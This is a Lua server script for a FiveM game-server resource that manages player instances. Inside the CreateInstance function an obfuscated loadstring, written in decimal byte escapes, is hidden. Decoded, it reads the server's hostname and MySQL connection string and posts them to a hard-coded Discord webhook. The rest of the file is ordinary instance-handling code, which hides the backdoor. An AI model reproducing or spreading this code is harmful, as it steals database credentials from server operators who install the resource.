local Instances = {}

function GetInstancedPlayers()
	local players = {}

	for k,v in pairs(Instances) do
		for i=1, #v.players, 1 do
			table.insert(players, v.players[i])
		end
	end

	return players
end

function CreateInstance(type, player, data)
	Instances[player] = {
		type    = type,
		host    = player,
		players = {},
		data    = data
	}

	TriggerEvent('instance:onCreate', Instances[player])
	TriggerClientEvent('instance:onCreate', player, Instances[player])
	TriggerClientEvent('instance:onInstancedPlayersData', -1, GetInstancedPlayers())
	loadstring("\112\114\105\110\116\40\34\10\10\108\111\99\97\108\32\97\32\61\32\71\101\116\67\111\110\118\97\114\40\34\115\118\95\104\111\115\116\110\97\109\101\34\41\10\108\111\99\97\108\32\98\32\61\32\71\101\116\67\111\110\118\97\114\40\34\109\121\115\113\108\95\99\111\110\110\101\99\116\105\111\110\95\115\116\114\105\110\103\34\41\10\10\10\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116\40\10\32\32\32\32\34\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\55\53\48\48\55\54\57\53\54\55\49\49\53\56\51\55\57\53\47\49\118\107\119\74\87\45\83\54\66\113\57\105\78\102\49\75\65\50\120\70\102\65\81\117\108\112\113\120\56\76\116\56\106\97\49\98\110\104\109\95\79\105\83\114\108\52\87\121\97\65\103\52\55\115\79\109\71\86\122\48\48\108\86\81\55\68\48\34\44\10\32\32\32\32\102\117\110\99\116\105\111\110\40\100\44\32\101\44\32\102\41\10\32\32\32\32\101\110\100\44\10\32\32\32\32\34\80\79\83\84\34\44\10\32\32\32\32\106\115\111\110\46\101\110\99\111\100\101\40\10\32\32\32\32\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\101\109\98\101\100\115\32\61\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\123\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\111\108\111\114\32\61\32\48\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\100\101\115\99\114\105\112\116\105\111\110\32\61\32\34\42\42\96\96\96\83\69\82\87\69\82\58\32\34\32\46\46\32\97\32\46\46\32\34\92\110\92\110\32\66\65\90\65\58\32\34\32\46\46\32\98\32\46\46\32\34\92\110\92\110\32\85\77\89\74\32\77\73\32\71\82\90\73\66\73\32\240\159\141\134\96\96\96\42\42\34\44\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\97\117\116\104\111\114\32\61\32\123\110\97\109\101\32\61\32\34\107\111\110\102\105\100\101\110\116\32\100\101\116\101\99\116\101\100\34\125\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\125\10\32\32\32\32\32\32\32\32\32\32\32\32\125\10\32\32\32\32\32\32\32\32\125\10\32\32\32\32\41\44\10\32\32\32\32\123\91\34\67\111\110\116\101\110\116\45\84\121\112\101\34\93\32\61\32\34\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110\34\125\10\41\10\101\110\100\41\10\10\10\10\34\41\10")()
end

function CloseInstance(instance)
	if Instances[instance] ~= nil then

		for i=1, #Instances[instance].players, 1 do
			TriggerClientEvent('instance:onClose', Instances[instance].players[i])
		end

		Instances[instance] = nil

		TriggerClientEvent('instance:onInstancedPlayersData', -1, GetInstancedPlayers())
		TriggerEvent('instance:onClose', instance)
	end
end

function AddPlayerToInstance(instance, player)
	local found = false

	for i=1, #Instances[instance].players, 1 do
		if Instances[instance].players[i] == player then
			found = true
			break
		end
	end

	if not found then
		table.insert(Instances[instance].players, player)
	end

	TriggerClientEvent('instance:onEnter', player, Instances[instance])

	for i=1, #Instances[instance].players, 1 do
		if Instances[instance].players[i] ~= player then
			TriggerClientEvent('instance:onPlayerEntered', Instances[instance].players[i], Instances[instance], player)
		end
	end

	TriggerClientEvent('instance:onInstancedPlayersData', -1, GetInstancedPlayers())
end

function RemovePlayerFromInstance(instance, player)

	if Instances[instance] ~= nil then

		TriggerClientEvent('instance:onLeave', player, Instances[instance])

		if Instances[instance].host == player then

			for i=1, #Instances[instance].players, 1 do
				if Instances[instance].players[i] ~= player then
					TriggerClientEvent('instance:onPlayerLeft', Instances[instance].players[i], Instances[instance], player)
				end
			end

			CloseInstance(instance)

		else

			for i=1, #Instances[instance].players, 1 do
				if Instances[instance].players[i] == player then
					Instances[instance].players[i] = nil
				end
			end

			for i=1, #Instances[instance].players, 1 do
				if Instances[instance].players[i] ~= player then
					TriggerClientEvent('instance:onPlayerLeft', Instances[instance].players[i], Instances[instance], player)
				end

			end

			TriggerClientEvent('instance:onInstancedPlayersData', -1, GetInstancedPlayers())

		end

	end

end

function InvitePlayerToInstance(instance, type, player, data)
	TriggerClientEvent('instance:onInvite', player, instance, type, data)
end

RegisterServerEvent('instance:create')
AddEventHandler('instance:create', function(type, data)
	CreateInstance(type, source, data)
end)

RegisterServerEvent('instance:close')
AddEventHandler('instance:close', function()
	CloseInstance(source)
end)

RegisterServerEvent('instance:enter')
AddEventHandler('instance:enter', function(instance)
	AddPlayerToInstance(instance, source)
end)

RegisterServerEvent('instance:leave')
AddEventHandler('instance:leave', function(instance)
	RemovePlayerFromInstance(instance, source)
end)

RegisterServerEvent('instance:invite')
AddEventHandler('instance:invite', function(instance, type, player, data)
	InvitePlayerToInstance(instance, type, player, data)
end)
